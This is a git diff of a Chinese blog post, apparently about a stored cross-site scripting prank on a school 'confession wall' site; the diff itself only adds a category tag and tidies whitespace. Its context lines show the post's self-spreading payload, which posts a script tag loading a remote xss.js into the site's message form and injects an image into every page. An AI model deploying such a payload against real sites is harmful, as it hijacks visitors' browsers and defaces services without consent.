@@ -5,7 +5,7 @@ date: 2015-02-06 09:22
 comments: true
 author: MewX
 published: true
-categories: [life]
+categories: [life, python]
 ---
 
 　　最近觉得学校的表白墙很好玩，而且人气也挺不错。有表白排行之类的有趣功能，经常能看到人刷屏、刷排行之类的。  
@@ -74,15 +74,15 @@ categories: [life]
 
 <?prettify lang=javascript?>
     // 省略 jQuery 代码
-    
+
     $(document).ready(function(){
-        
+
         var obj = document.getElementById("LoveX");
         if(obj) return;
-        
+
         $("body:first").prepend("<img id=\"LoveX\" src=\"http://www.dwz.cn/XXXXX\" style=\"width:350px;height:350px\"/>");
         //$(".LoveX").insertAfter("header");
-      
+
         // Ajax
         var params = {save:1,book_title:'此处打码',book_name:'MewX',book_body:'<script type=\"text/javascript\" src=\"http://mewx.org/js/xss.js\"></script>',submit:'发布'};
         url = 'http://xxxxxxxxx.sinaapp.com/add_express.php';
@@ -105,4 +105,3 @@ categories: [life]
 　　  
 
 　　补：以上纯属闹剧，表白对象与我也毫无干系 \_(:з」∠)\_ 各位借此能了解一下XSS便好。以上恶意举动仅作技术研究。  
-
